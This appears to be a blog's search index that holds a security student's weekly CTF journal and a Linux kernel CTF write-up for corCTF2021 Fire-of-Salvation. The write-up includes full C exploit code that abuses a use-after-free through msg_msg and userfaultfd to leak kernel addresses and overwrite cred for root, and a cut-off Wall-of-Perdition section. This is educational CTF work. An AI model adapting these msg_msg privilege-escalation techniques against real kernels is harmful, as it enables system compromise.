[{"categories":["Life"],"content":"普普通通的周报 Keep going, never stop. 続けて、止まらない。 ","date":"0001-01-01","objectID":"/jounal/:0:0","series":null,"tags":["Journal"],"title":"Niebelungenのjournal","uri":"/jounal/#"},{"categories":["Life"],"content":"Niebelungenのjournal","date":"0001-01-01","objectID":"/jounal/:0:0","series":null,"tags":["Journal"],"title":"Niebelungenのjournal","uri":"/jounal/#niebelungenのjournal"},{"categories":["Life"],"content":"2021-3.1~3.7 Glibc-2.20-malloc review IDApython learning 学习了基础的MIPS指令与函数调用，使用IDApython可以实现对敏感函数及其参数标识，但是参数溯源功能还是有很多的bug。下周继续学习ing ","date":"0001-01-01","objectID":"/jounal/:1:0","series":null,"tags":["Journal"],"title":"Niebelungenのjournal","uri":"/jounal/#2021-3137"},{"categories":["Life"],"content":"2021-3.8~3.14 IDApython learning 摸了NahamCon CTF 摸了V\u0026N CTF 大失败啊，一天做了两个easy，还是要刷题啊。 ","date":"0001-01-01","objectID":"/jounal/:2:0","series":null,"tags":["Journal"],"title":"Niebelungenのjournal","uri":"/jounal/#2021-38314"},{"categories":["Life"],"content":"2021-3.15~3.21 How2heap-Glibc-2.23 FIDL反编译层API学习 NepCTF 自己的不足还是很多的，下周希望能投入更多的精力到做题上，多加练习。 ","date":"0001-01-01","objectID":"/jounal/:3:0","series":null,"tags":["Journal"],"title":"Niebelungenのjournal","uri":"/jounal/#2021-315321"},{"categories":["Life"],"content":"2021-3.22~3.28 How2heap-Glibc-2.27 \u0026 Glibc-2.31 CodeQL 初学 CodeQL很强，但是这次只是学了一些基本的语法和数据流。以后有机会再深入学习漏洞模式。做了一些PWN的练习题，但是很多都是已经掌握的利用方式，只能当成巩固了。 给新生赛出了几个签到题，学习了一下gcc的保护选项。 ","date":"0001-01-01","objectID":"/jounal/:4:0","series":null,"tags":["Journal"],"title":"Niebelungenのjournal","uri":"/jounal/#2021-322328"},{"categories":["Life"],"content":"2021-3.29~4.4 Unix环境编程，对进程、线程和信号等重点学习了。 虎符 安恒三月赛 现在打这种虎符ctf，对像我这样基础的pwn手来说很不友好😥，我没有一个深入的方向。Re逆向能力有待提升，要学习加密与解密。 ","date":"0001-01-01","objectID":"/jounal/:5:0","series":null,"tags":["Journal"],"title":"Niebelungenのjournal","uri":"/jounal/#2021-32944"},{"categories":["Life"],"content":"2021-4.5~4.11 疯狂的刷题 angstromctf 2021碰到几个很有趣的思路 复现了前几周没做出来的比赛题 复现了一个HTB的wp（方班摸鱼），依然在研究能学到很多东西。 天问的任务有点拉下了，最近还有很多的作业😥 ","date":"0001-01-01","objectID":"/jounal/:6:0","series":null,"tags":["Journal"],"title":"Niebelungenのjournal","uri":"/jounal/#2021-45411"},{"categories":["Life"],"content":"2021-4.12~4.18 疯狂的刷题 代码审计 python的垃圾回收机制 代码审计的艺术yyds！ ","date":"0001-01-01","objectID":"/jounal/:7:0","series":null,"tags":["Journal"],"title":"Niebelungenのjournal","uri":"/jounal/#2021-412418"},{"categories":["Life"],"content":"2021-4.19~4.25 疯狂的刷题 python的垃圾回收机制review ？怎么感觉这周什么都没干？？多了两门课头大 ","date":"0001-01-01","objectID":"/jounal/:8:0","series":null,"tags":["Journal"],"title":"Niebelungenのjournal","uri":"/jounal/#2021-419425"},{"categories":["Life"],"content":"2021-4.26~5.02 刷题 摸鱼太狠了，已经忘了自己干过什么了~~ 听了一些学长的看法，如果想要直接就业的话，还是要尽早去实习。我总觉得我现在的技术能力并不知道会有什么公司要我。另外，越来越觉得CTF并不能打一辈子，还是要尽快转到漏洞挖掘的实战中。公司面试的时候都要求在CTF中取得一定成绩，现在我也是很想打出一定的成绩后再退役的，至少要进过线下。啊，要学的东西太多了（不想上学了呜呜呜~ 天问那边最近划水了，要尽快跟上。 ","date":"0001-01-01","objectID":"/jounal/:9:0","series":null,"tags":["Journal"],"title":"Niebelungenのjournal","uri":"/jounal/#2021-426502"},{"categories":["Life"],"content":"2021-5.03~5.09 刷题 加入NaN 带我的学长很多都去考研了，Kirin我也没怎么和他交流，问题怪不好意思的，现在只能慢慢摸索了 津门杯\u0026红帽杯 第一次体会到一起做题的快乐，太爽了，师傅们都很棒！虽然没有进线下，电脑还进水了（借的电脑临时搭环境做题），但是rank37距离线下已经很近了，加油！ 这周和下周是有很多考试，真的要死了~ ","date":"0001-01-01","objectID":"/jounal/:10:0","series":null,"tags":["Journal"],"title":"Niebelungenのjournal","uri":"/jounal/#2021-503509"},{"categories":["Life"],"content":"2021-5.10~5.16 刷题 简单的搭建了一个异构汇编的运行调试环境，还尝试了使用vscode ssh远程做题 参加国赛 题目比去年难了一点，阴间的堆风水，阴间的比赛时间（三张试卷？冲刺卷？宁搁这高考呢？ ","date":"0001-01-01","objectID":"/jounal/:11:0","series":null,"tags":["Journal"],"title":"Niebelungenのjournal","uri":"/jounal/#2021-510516"},{"categories":["Life"],"content":"2021-5.17~5.23 三天复习算法 两天学完集合论与图论 在学院极度合理的活动安排下，让我有了那么多的复习时间，真是太棒了！（什么垃圾，赶快爬好吗 搭建AFL源码调试环境 开始阅读AFL源码了，电脑依旧坏，真是难受。现在看了afl-gcc的部分，代码写的条理很清晰。 暑期实习get 没想到真的通过了，太好了，不是没人要了呜呜呜~ ","date":"0001-01-01","objectID":"/jounal/:12:0","series":null,"tags":["Journal"],"title":"Niebelungenのjournal","uri":"/jounal/#2021-517523"},{"categories":["Life"],"content":"2021-5.24~5.30 一周三次实验 春秋杯-战队考核 虽然是考核，但是太难了根本没人做出来。。。 DASCTF-May 安恒的月赛，两道基础的heap，ak了 调试fmt漏洞 挺过死亡考试周，摸鱼了（ ","date":"0001-01-01","objectID":"/jounal/:13:0","series":null,"tags":["Journal"],"title":"Niebelungenのjournal","uri":"/jounal/#2021-524530"},{"categories":["Life"],"content":"2021-5.31~6.06 uCore-Tiny Kernel Learing sakura的任务罢了，虽然快要考试了，但是写内核这么酷的事谁能拒绝呢？（ NEWSCTF 三道pwn题，baby_heap+fmt+orwheap，都是最近见过的思路，ak了 ","date":"0001-01-01","objectID":"/jounal/:14:0","series":null,"tags":["Journal"],"title":"Niebelungenのjournal","uri":"/jounal/#2021-531606"},{"categories":["Life"],"content":"2021-6.07~6.13 继续写内核 强网杯 自闭了，简单题都没做出来。虽然都能找出来洞，但是利用思路却想不到，心态有点问题 : ( ","date":"0001-01-01","objectID":"/jounal/:15:0","series":null,"tags":["Journal"],"title":"Niebelungenのjournal","uri":"/jounal/#2021-607613"},{"categories":["Life"],"content":"2021-6.14~6.20 内核-lab2 国赛分区赛 第一次AWD比赛，缺少很多经验，大部分的题目都是通过流量转发出来的，而自己能patch正确的很少 ","date":"0001-01-01","objectID":"/jounal/:16:0","series":null,"tags":["Journal"],"title":"Niebelungenのjournal","uri":"/jounal/#2021-614620"},{"categories":["Life"],"content":"2021-6.21~6.27 开始上班（xxx） 准备考试周 ","date":"0001-01-01","objectID":"/jounal/:17:0","series":null,"tags":["Journal"],"title":"Niebelungenのjournal","uri":"/jounal/#2021-621627"},{"categories":["Life"],"content":"2021-6.28~7.04 GKCTF 简单的md5都没看出来 ","date":"0001-01-01","objectID":"/jounal/:18:0","series":null,"tags":["Journal"],"title":"Niebelungenのjournal","uri":"/jounal/#2021-628704"},{"categories":["Life"],"content":"2021-7.05~7.11 0CTF 一场很好的国际赛，看了两道简单题abs8()没看出来，也第一次听说了musl，现学源码写了一半的利用，可惜要考试搞不懂了。 准备教学课件 与社团办了一个创新课，自己讲述二进制相关内容。 摸鱼看了看ctfshow的比赛。 ","date":"0001-01-01","objectID":"/jounal/:19:0","series":null,"tags":["Journal"],"title":"Niebelungenのjournal","uri":"/jounal/#2021-705711"},{"categories":["Life"],"content":"2021-6.21~9.20这是我的实习期间。可以说我受到了组长和同事极大的照顾，组长经常叫我去学习，同事也对我的不断的提问都给了回复。 我做的主要工作就是复现和分析组长给我的cve的poc，这些都是微软提供的，属于保密事项。对于我从来没有接触过windows的人来说，这是一个巨大的挑战。我通过阅读大量的英文资料和进行痛苦的调试学习了很多知识，也认识到了windows的复杂。另一方面的工作是将一些windows的fuzz工具进行测试。即用我学习的cve作为目标来实验。这是非常麻烦的事，我使用的第一个工具非常的古老，以致于不支持我的目标。第二个工具，WTF是一位非常有名的逆向工程师写的。我觉得他的思路非常好。现在这个工具已经到达了0.2版本，进行了很多的更新。各位感兴趣可以看看。 ","date":"0001-01-01","objectID":"/jounal/:20:0","series":null,"tags":["Journal"],"title":"Niebelungenのjournal","uri":"/jounal/#2021-621920"},{"categories":["Life"],"content":"Re我很久都没有写周报，原因之一是在结束实习后，我外出参加了很多的比赛。第二点是我对将来是工作还是考研陷入了迷茫。 在我实习阶段，我与组长聊过这个问题。她看出来我希望得到技术的提升，但是告诉我如果想要超越那些很厉害的人基本是不可能了，他们很早就接触学习这方面的知识。所以劝我考研。组长已经进入社会很久了，她给我讲了讲研究生的好处。总结来说就是有着更高的社会认可度，这个可以让你在生活的很多方面有着优势，比如在北京或者其他外地生活。 skr师傅说，读书可以多点选择，但是不能放弃技术，建议两手准备。我比较认同，所以我正打算这样做。 所以，在长达近四个月后，我又在这里写了一些东西。之后这个博客不会被放弃，但是更新的频率可能是不定期。 Is this a compromise of life or another way to get closer to the ideal? ","date":"0001-01-01","objectID":"/jounal/:0:0","series":null,"tags":["Journal"],"title":"Niebelungenのjournal","uri":"/jounal/#re"},{"categories":["Life"],"content":"? ~2022-6.13Hi, it’s been a long time. Now, I have finished most of my junior year and from now on I will focus on preparing for the postgraduate examination. I want to record some thoughts. Rust: Yeah, I have learned some Rust in the past few weeks. It’s a very amazing program language. As the author says “Rust makes aggressive bets.” in the Rust Book. Some concepts are not easy to adapt, but Rust believes it’s worthy. Usually, performance will lose when you pursuit high security. I changed my view since I know Rust could generate almost same assembly code as c! This means it has the potential to achieve high performance while pursuing high security! Rust might change the world, I’m looking forward it! Kernel Pwn: Recently, I find some kernel challenge is boring. Actually, most kernel challenges focus on exploiting methods while finding a bug is really point in kernel bug hunting. If you want to be good at kernel pwn, you should know the kernel well. So why not pay more attention to learning kernel instead of ctf challenges. And I find in Virtual Machine, ubuntu will open some mitigation which caused I can’t read fd_array. I still don’t figure out it. Funny blog: Cybersecurity education in my school is shit! I found some helpful bolg as followed: Python VM: use Python to implement a CPU which has melt down. In this write-up, you will understand how melt down in CPU works clearly! Breaking-The-x86-ISA: Do the secret instructions exist in x86 instructions set? X86 is CISV, some bit combinations are not documented in the manual. If they could be run, they are maybe the hidden instructions. The author used a great method to find them and he really got some funny results. Insert-backdoor-into-compiler：It is possible to compile programs with backdoors using a compiler with a backdoor. So when the compiler compiles its own normal code (without adding the backdoor), how do you get it to complete the bootstrap? ","date":"0001-01-01","objectID":"/jounal/:1:0","series":null,"tags":["Journal"],"title":"Niebelungenのjournal","uri":"/jounal/#-2022-613"},{"categories":["Writeups"],"content":"Spark","date":"2022-04-08","objectID":"/hitcon2020-spark/:0:0","series":null,"tags":["Writeups","Kernel"],"title":"HITCON2020 Spark","uri":"/hitcon2020-spark/#spark"},{"categories":["Writeups"],"content":"corCTF2021-msg_msg在D^3CTF2022中的d3kheap，看上去是比较简单的一道题目，我（A Linux kernel newbie）一直苦于如何leak内核地址信息。在official writep中提到了msg_msg可以leak。所以我就去找了相关的资料，发现了这两个题目 corCTF2021 的 Fire-of-Salvation 和 Wall-of-Perdition 。这两个题目是一个系列，前者为简单模式，后者为困难模式。比赛中为零解，作者在博客中使用 msg_msg 结构构造了内核任意地址读写原语。 题目Github仓库： corCTF-2021-public-challenge-archive/pwn at main · Crusaders-of-Rust/corCTF-2021-public-challenge-archive ","date":"2022-03-18","objectID":"/corctf2021-msg_msg/:0:0","series":null,"tags":["Writeups","Kernel"],"title":"CorCTF2021 Msg_msg","uri":"/corctf2021-msg_msg/#corctf2021-msg_msg"},{"categories":["Writeups"],"content":"程序分析两个题目都实现了Netfilter hooks，可以对内核收到网络数据包进行回调处理。但是与本题利用无关，更详细的知识可以看下面的博客： Linux Kernel Communication - Netfilter Hooks 模块实现了5个功能： firewall_add_rule ：添加一条规则到指定的入站/出战的全局的链表中 firewall_delete_rule ：从指定的链表中删除一条规则，对应位置置空 firewall_edit_rule ：修改某一链表中的规则 firewall_show_rule ：未实现具体功能 firewall_dup_rule ：将一个链表上的规则复制到另一个链表上第一个为空的位置，副本规则的 is_duplicated 字段置为1 这实际也是一个菜单题。入站和出站的规则用两个全局指针维护： rule_t **firewall_rules_in; rule_t **firewall_rules_out; rule_t结构体如下： #ifdef EASY_MODE #define DESC_MAX 0x800 #endif typedef struct { char iface[16]; char name[16]; char ip[16]; char netmask[16]; uint8_t idx; uint8_t type; uint16_t proto; uint16_t port; uint8_t action; #ifdef EASY_MODE char desc[DESC_MAX]; #endif } user_rule_t; typedef struct { char iface[16]; char name[16]; uint32_t ip; uint32_t netmask; uint16_t proto; uint16_t port; uint8_t action; uint8_t is_duplicated; #ifdef EASY_MODE char desc[DESC_MAX]; #endif } rule_t; 在 EASY_MODE 下，rule_t 结构大小为0x830，该内存会从kmalloc-4096中取出，而困难模式下，rule_t 的结构体大小只有 0x30 字节，该内存会从kmalloc-64中取出。这也是两个题目唯一的区别了。 模块的漏洞在于，delete一个链上的规则后，并不会将其副本进行free。从而构成了UAF。 CONFIG_SLAB=y CONFIG_SLAB_FREELIST_RANDOM=y CONFIG_SLAB_FREELIST_HARDEN=y CONFIG_STATIC_USERMODEHELPER=y CONFIG_STATIC_USERMODEHELPER_PATH=\"\" CONFIG_FG_KASLR=y SMEP, SMAP, and KPTI are of course on. Note that this is an easier variation of the Wall of Perdition challenge. 内核使用SLAB 分配器，开启了freelist保护，且modprobe_path不可写，还开启了FG_KASLR。 ","date":"2022-03-18","objectID":"/corctf2021-msg_msg/:1:0","series":null,"tags":["Writeups","Kernel"],"title":"CorCTF2021 Msg_msg","uri":"/corctf2021-msg_msg/#程序分析"},{"categories":["Writeups"],"content":"内核IPC —— msgsnd()与msgrcv()源码分析介绍：内核提供了两个syscall来进行IPC通信， msgsnd() 和 msgrcv()，内核消息包含两个部分，消息头 msg_msg 结构和紧跟的消息数据。长度从kmalloc-64 到 kmalloc-4096。消息头 msg_msg 结构如下所示。 struct msg_msg { struct list_head m_list; long m_type; size_t m_ts; /* message text size */ struct msg_msgseg *next; void *security; // security指针总为0，因为未开启SELinux /* the actual message follows immediately */ }; ","date":"2022-03-18","objectID":"/corctf2021-msg_msg/:2:0","series":null,"tags":["Writeups","Kernel"],"title":"CorCTF2021 Msg_msg","uri":"/corctf2021-msg_msg/#内核ipc--msgsnd与msgrcv源码分析"},{"categories":["Writeups"],"content":"msgsnd() 数据发送总体流程：当调用 msgsnd() 来发送消息时，调用 msgsnd() -\u003e ksys_msgsnd() -\u003e do_msgsnd() -\u003e load_msg() -\u003e alloc_msg() 来分配消息头和消息数据，然后调用 load_msg() -\u003e copy_from_user() 来将用户数据拷贝进内核。 重点看一下内存的分配： static struct msg_msg *alloc_msg(size_t len) { struct msg_msg *msg; struct msg_msgseg **pseg; size_t alen; alen = min(len, DATALEN_MSG); msg = kmalloc(sizeof(*msg) + alen, GFP_KERNEL_ACCOUNT); if (msg == NULL) return NULL; msg-\u003enext = NULL; msg-\u003esecurity = NULL; len -= alen; pseg = \u0026msg-\u003enext; while (len \u003e 0) { struct msg_msgseg *seg; cond_resched(); alen = min(len, DATALEN_SEG); seg = kmalloc(sizeof(*seg) + alen, GFP_KERNEL_ACCOUNT); if (seg == NULL) goto out_err; *pseg = seg; seg-\u003enext = NULL; pseg = \u0026seg-\u003enext; len -= alen; } return msg; out_err: free_msg(msg); return NULL; } 如果消息长度超过0xfd0，则分段存储，采用单链表连接，第1个称为消息头，用 msg_msg 结构存储；第2、3个称为segment，用 msg_msgseg 结构存储。消息的最大长度 /proc/sys/kernel/msgmax 确定， 默认大小为 8192 字节，所以最多链接3个成员。 ","date":"2022-03-18","objectID":"/corctf2021-msg_msg/:2:1","series":null,"tags":["Writeups","Kernel"],"title":"CorCTF2021 Msg_msg","uri":"/corctf2021-msg_msg/#msgsnd-数据发送"},{"categories":["Writeups"],"content":"msgsrv() 数据接收总体流程： msgrcv() -\u003e ksys_msgrcv() -\u003e do_msgrcv() -\u003e find_msg() \u0026 do_msg_fill() \u0026 free_msg()。 调用 find_msg() 来定位正确的消息，将消息从队列中unlink，再调用 do_msg_fill() -\u003e store_msg() 来将内核数据拷贝到用户空间，最后调用 free_msg() 释放消息。 static long do_msgrcv(int msqid, void __user *buf, size_t bufsz, long msgtyp, int msgflg, long (*msg_handler)(void __user *, struct msg_msg *, size_t)) { int mode; struct msg_queue *msq; struct ipc_namespace *ns; struct msg_msg *msg, *copy = NULL; DEFINE_WAKE_Q(wake_q); // ... msg = find_msg(msq, \u0026msgtyp, mode); if (!IS_ERR(msg)) { /* * Found a suitable message. * Unlink it from the queue. */ if ((bufsz \u003c msg-\u003em_ts) \u0026\u0026 !(msgflg \u0026 MSG_NOERROR)) { msg = ERR_PTR(-E2BIG); goto out_unlock0; } /* * If we are copying, then do not unlink message and do * not update queue parameters. */ if (msgflg \u0026 MSG_COPY) { msg = copy_msg(msg, copy); goto out_unlock0; } list_del(\u0026msg-\u003em_list); msq-\u003eq_qnum--; msq-\u003eq_rtime = ktime_get_real_seconds(); ipc_update_pid(\u0026msq-\u003eq_lrpid, task_tgid(current)); msq-\u003eq_cbytes -= msg-\u003em_ts; atomic_sub(msg-\u003em_ts, \u0026ns-\u003emsg_bytes); atomic_dec(\u0026ns-\u003emsg_hdrs); ss_wakeup(msq, \u0026wake_q, false); goto out_unlock0; } // ... out_unlock0: ipc_unlock_object(\u0026msq-\u003eq_perm); wake_up_q(\u0026wake_q); out_unlock1: rcu_read_unlock(); if (IS_ERR(msg)) { free_copy(copy); return PTR_ERR(msg); } bufsz = msg_handler(buf, msg, bufsz); free_msg(msg); return bufsz; } 如果发现了合适的消息，会将其拷贝给用户，若是未设置MSG_COPY 字段，会将消息进行unlink。 消息拷贝：do_msg_fill() -\u003e store_msg() 。和创建消息的过程一样，先拷贝消息头（msg_msg结构对应的数据），再拷贝segment（msg_msgseg结构对应的数据）。 static long do_msg_fill(void __user *dest, struct msg_msg *msg, size_t bufsz) { struct msgbuf __user *msgp = dest; size_t msgsz; if (put_user(msg-\u003em_type, \u0026msgp-\u003emtype)) return -EFAULT; msgsz = (bufsz \u003e msg-\u003em_ts) ? msg-\u003em_ts : bufsz; if (store_msg(msgp-\u003emtext, msg, msgsz)) return -EFAULT; return msgsz; } int store_msg(void __user *dest, struct msg_msg *msg, size_t len) { size_t alen; struct msg_msgseg *seg; alen = min(len, DATALEN_MSG); if (copy_to_user(dest, msg + 1, alen)) return -1; for (seg = msg-\u003enext; seg != NULL; seg = seg-\u003enext) { len -= alen; dest = (char __user *)dest + alen; alen = min(len, DATALEN_SEG); if (copy_to_user(dest, seg + 1, alen)) return -1; } return 0; } 消息释放：free_msg。先释放消息头，再释放segment。 void free_msg(struct msg_msg *msg) { struct msg_msgseg *seg; security_msg_msg_free(msg); seg = msg-\u003enext; kfree(msg); while (seg != NULL) { struct msg_msgseg *tmp = seg-\u003enext; cond_resched(); kfree(seg); seg = tmp; } } MSG_COPY：如果用flag MSG_COPY来调用 msgrcv() （内核编译时需配置CONFIG_CHECKPOINT_RESTORE选项，默认已配置），就会调用 prepare_copy() 分配临时消息，并调用 copy_msg() 将请求的数据拷贝到该临时消息。在将消息拷贝到用户空间之后，原始消息会被保留，不会从队列中unlink，然后调用free_msg()删除该临时消息，这对于利用很重要。 为什么？因为本漏洞在第一次UAF的时候，没有泄露正确地址，所以会破坏msg_msg-\u003em_list 双链表指针，unlink会触发崩溃 ","date":"2022-03-18","objectID":"/corctf2021-msg_msg/:2:2","series":null,"tags":["Writeups","Kernel"],"title":"CorCTF2021 Msg_msg","uri":"/corctf2021-msg_msg/#msgsrv数据接收"},{"categories":["Writeups"],"content":"Fire-of-Salvation","date":"2022-03-18","objectID":"/corctf2021-msg_msg/:3:0","series":null,"tags":["Writeups","Kernel"],"title":"CorCTF2021 Msg_msg","uri":"/corctf2021-msg_msg/#fire-of-salvation"},{"categories":["Writeups"],"content":"越界读泄露内核地址首先，对一个rule_t进行UAF，只要add，dup，free即可。此时，我们控制了一个空闲的kmalloc-4096结构。 接着，发送一个0xfd0+0x30大小的消息。msg_msg结构会占据我们控制的kmalloc-4096，其next指向了一个kmalloc-64内存块。然后，通过UAF改大msg_msg的m_ts结构就能越界读segment后面的内存。 这里的问题是不能确定segment后面有什么样的地址信息。为此，我们可以在发送消息后，喷射大量的shm_file_data结构。 struct shm_file_data { int id; struct ipc_namespace *ns; struct file *file; const struct vm_operations_struct *vm_ops; }; 这样就可以读到init_ipc_ns的值，该数据为全局变量不受FG_KALSR影响。 send_msg(qid, message, 0x1010 - 0x30, 0); printf(\"[*] Heap spary...\\n\"); heap_spary(0x80); printf(\"[*] Edit msg...\\n\"); ((struct msg_msg *)rule)-\u003em_list.next = (void *)0xAAAAAAAA; ((struct msg_msg *)rule)-\u003em_list.prev = (void *)0xBBBBBBBB; ((struct msg_msg *)rule)-\u003em_ts = 0x1000 + 0x500; ((struct msg_msg *)rule)-\u003em_type = 1; rule-\u003eidx = 0; rule-\u003etype = OUTBOUND; strcpy(rule-\u003eip, \"000000000\"); ioctl(global_fd, EDIT_RULE, rule); uint64_t *dump = calloc(1, 0x1500); printf(\"[+] dump:\\t%p\\n\", dump); ret = msgrcv(qid, dump, 0x1500, 0, IPC_NOWAIT | MSG_COPY | MSG_NOERROR); if (ret \u003c 0) { die(\"[!] Failed to recv message\"); } int i; for (i = 0xff0 / 8; i \u003c 0x1500 / 8; i++) { if ((dump[i] \u0026 0xfff) == 0x7a0) { init_ipc_ns = dump[i]; printf(\"[+] index: %d\\n\", i); break; } } kernbase = init_ipc_ns - 0xc3d7a0; init_task = kernbase + 0xc124c0; init_cred = kernbase + 0xc33060; 这样我们得到了内核基址，init_task和init_cred。 ","date":"2022-03-18","objectID":"/corctf2021-msg_msg/:3:1","series":null,"tags":["Writeups","Kernel"],"title":"CorCTF2021 Msg_msg","uri":"/corctf2021-msg_msg/#越界读泄露内核地址"},{"categories":["Writeups"],"content":"任意地址读 \u0026 task_struct 遍历我们使用了MSG_COPY，内核中的消息并没有被free，可供我们多次读取。我们可以UAF修改next字段为任意值，实现任意地址读。 通过遍历init_task的tasks链表，找到当前进程的task_struct。 printf(\"[*] Task struct searching...\\n\"); pid_t pid = getpid(); printf(\"[+] self pid:\\t%d\\n\", pid); uint64_t cur = init_task; for (;;) { pid_t cur_id = 0; bzero(rule-\u003eip, 16); ip_value_to_str(cur + 0x290, rule-\u003eip, 16); ip_value_to_str((cur + 0x290) \u003e\u003e 32, rule-\u003enetmask, 16); ioctl(global_fd, EDIT_RULE, rule); bzero(dump, 0x1500); ret = msgrcv(qid, dump, 0x1500, 0, IPC_NOWAIT | MSG_COPY | MSG_NOERROR); if (ret \u003c 0) { die(\"[!] Failed to recv message\"); } // read pid cur_id = *((uint32_t *)((uint64_t)dump + 0x10d8)); printf(\"[+] cur:\\t0x%lx, pid:\\t%d\\n\", cur, cur_id); if (cur_id == pid) { task_struct = cur; break; } // next cur = *((uint64_t *)((uint64_t)dump + 0xfe0)) - 0x298; } printf(\"[+] task_struct:\\t0x%lx\\n\", task_struct); ","date":"2022-03-18","objectID":"/corctf2021-msg_msg/:4:0","series":null,"tags":["Writeups","Kernel"],"title":"CorCTF2021 Msg_msg","uri":"/corctf2021-msg_msg/#任意地址读--task_struct-遍历"},{"categories":["Writeups"],"content":"任意地址写在发送消息时，内核先将内存空间准备好，再进行数据拷贝。我们可以使用userfaultfd，在其拷贝msg_msg结构数据时，挂起。修改其next字段指向当前进程的cred-8，保持segment的next为NULL。 释放，修改cred和real_cred为init_cred实现提权。 ","date":"2022-03-18","objectID":"/corctf2021-msg_msg/:4:1","series":null,"tags":["Writeups","Kernel"],"title":"CorCTF2021 Msg_msg","uri":"/corctf2021-msg_msg/#任意地址写"},{"categories":["Writeups"],"content":"EXP #include \"./exploit.h\" #define ADD_RULE 0x1337babe #define DELETE_RULE 0xdeadbabe #define EDIT_RULE 0x1337beef #define SHOW_RULE 0xdeadbeef #define DUP_RULE 0xbaad5aad #define INBOUND 0 #define OUTBOUND 1 #define SKIP -1 #define DESC_MAX 0x800 typedef struct { char iface[16]; char name[16]; char ip[16]; char netmask[16]; uint8_t idx; uint8_t type; uint16_t proto; uint16_t port; uint8_t action; char desc[DESC_MAX]; } user_rule_t; struct list_head { struct list_head *next, *prev; }; struct msg_msg { struct list_head m_list; long m_type; size_t m_ts; /* message text size */ void *next; /* struct msg_msgseg *next; */ void *security; //无SELinux，这里为NULL /* the actual message follows immediately */ }; typedef struct { long mtype; char mtext[1]; } msg; int global_fd; uint64_t kernbase, init_ipc_ns, init_task, init_cred; uint64_t task_struct; int qid; char msg_buf[0x2000]; void ip_value_to_str(int ip, char *result, int size) { inet_ntop(AF_INET, (void *)\u0026ip, result, size); } void add_rule(user_rule_t *rule) { int ret = 0; ret = ioctl(global_fd, ADD_RULE, rule); if (ret \u003c 0) { die(\"[!] Failed to add rule\"); } } void dup_rule(user_rule_t *rule) { int ret = 0; ret = ioctl(global_fd, DUP_RULE, rule); if (ret \u003c 0) { die(\"[!] Failed to dup rule\"); } } void del_rule(user_rule_t *rule) { int ret = 0; ret = ioctl(global_fd, DELETE_RULE, rule); if (ret \u003c 0) { die(\"[!] Failed to del rule\"); } } void send_msg(int id, void *buf, size_t size, int flags) { if (msgsnd(id, buf, size, flags) \u003c 0) { die(\"[!] Failed to send msg\"); } printf(\"[+] Send message: 0x%lx\\n\", size); } void heap_spary(size_t cnt) { int i = 0; int shmid = 0; void *addr = NULL; for (i = 0; i \u003c cnt; i++) { shmid = shmget(IPC_PRIVATE, 100, 0600); if (shmid \u003c 0) { die(\"[!] shmget failed\"); } addr = shmat(shmid, NULL, 0); if (addr == (void *)-1) { die(\"[!] shmat failed\"); } } printf(\"[+] heap_spary shm, cnt:\\t0x%lx\\n\", cnt); } static void fault_handler_thread(void *arg) { puts(\"[+] entered fault_handler_thread!\"); static struct uffd_msg uf_msg; uint64_t uffd = (uint64_t)arg; struct pollfd pollfd; int nready; pollfd.fd = uffd; pollfd.events = POLLIN; puts(\"[+] polling...\"); while ((nready = poll(\u0026pollfd, 1, -1)) \u003e 0) { if (pollfd.revents \u0026 POLLERR || pollfd.revents \u0026 POLLHUP) { die(\"[!] poll failed\\n\"); } if ((read(uffd, \u0026uf_msg, sizeof(uf_msg))) == 0) { die(\"[!] read uffd msg failed\\n\"); } if (uf_msg.event != UFFD_EVENT_PAGEFAULT) { die(\"[!] unexpected pagefault\\n\"); } printf(\"[+] page fault: %p\\n\", (void *)uf_msg.arg.pagefault.address); printf(\"[*] Change next to task_struct-\u003ecred\\n\"); user_rule_t *rule = calloc(1, sizeof(user_rule_t)); ((struct msg_msg *)rule)-\u003em_list.next = (void *)0xAAAAAAAA; ((struct msg_msg *)rule)-\u003em_list.prev = (void *)0xBBBBBBBB; ((struct msg_msg *)rule)-\u003em_ts = 0x1000 + 0x500; ((struct msg_msg *)rule)-\u003em_type = 1; rule-\u003eidx = 1; rule-\u003etype = OUTBOUND; ip_value_to_str(task_struct + 0x530, rule-\u003eip, 16); ip_value_to_str((task_struct + 0x530) \u003e\u003e 32, rule-\u003enetmask, 16); ioctl(global_fd, EDIT_RULE, rule); bzero(msg_buf, 0x2000); int idx = 0xfd0 / 8; ((uint64_t *)msg_buf)[idx++] = init_cred; ((uint64_t *)msg_buf)[idx++] = init_cred; ((uint64_t *)msg_buf)[idx++] = init_cred; ((uint64_t *)msg_buf)[idx++] = init_cred; uffd_copy(uffd, msg_buf, \u0026uf_msg); break; } puts(\"[+] exit fault_handler_thread!\"); } int main() { user_rule_t *rule = calloc(1, sizeof(user_rule_t)); msg *message = (msg *)msg_buf; int ret = 0; global_fd = open(\"/dev/firewall\", O_RDWR); if (global_fd \u003c 0) { die(\"[!] Failed to open /dev/firewall\"); } qid = msgget(IPC_PRIVATE, 0666 | IPC_CREAT); if (qid \u003c 0) { die(\"[!] Failed to msgget\"); } printf(\"[+] qid = %d\\n\", qid); printf(\"[*] UAF prepare...\\n\"); rule-\u003eidx = 0; rule-\u003etype = INBOUND; strcpy(rule-\u003enetmask, \"255.255.255.255\"); strcpy(rule-\u003eip, \"127.0.0.1\"); add_rule(rule); dup_rule(rule); del_rule(rule); printf(\"[*] Send message\\n\"); bzero(msg_buf, 0x2000); message-\u003emtype = 1; memset(message-\u003emtext, 'A', 0x1010); send_msg(qid, message, 0x1010 - 0x30","date":"2022-03-18","objectID":"/corctf2021-msg_msg/:4:2","series":null,"tags":["Writeups","Kernel"],"title":"CorCTF2021 Msg_msg","uri":"/corctf2021-msg_msg/#exp"},{"categories":["Writeups"],"content":"Wall-of-PerditionUAF依然存在，但在kmalloc-64中。我们依然可以通过修改m_ts进行越界读。在我们得到内核的基址后，似乎并不能进行任意地址写了。 实现任意地址写需要控制next指针，如果想要控制msg_msg结构的next，消息大小就大于64，不会申请到kmalloc-64。如果想控制kmalloc-64的segment的next，m_ts不能修改，不能进行越界。另一种思路是直接修改next，但是此时会遇到与第一种相同的情况，segment大小大于64无法UAF。 实现任意写最重要的是使一个msg_msg结构出现在可控的空间。 ","date":"2022-03-18","objectID":"/corctf2021-msg_msg/:5:0","series":null,"tags":["Writeups","Kernel"],"title":"CorCTF2021 Msg_msg","uri":"/corctf2021-msg_msg/#wall-of-perdition"},{"categories":["Writeups"],"content":"泄露内核基址 \u0026 msg 链表构造一个UAF的kmalloc-64，然后申请两个消息队列： qid[0] = msgget(IPC_PRIVATE, 0666 | IPC_CREAT); if (qid[0] \u003c 0) { die(\"[!] Failed to 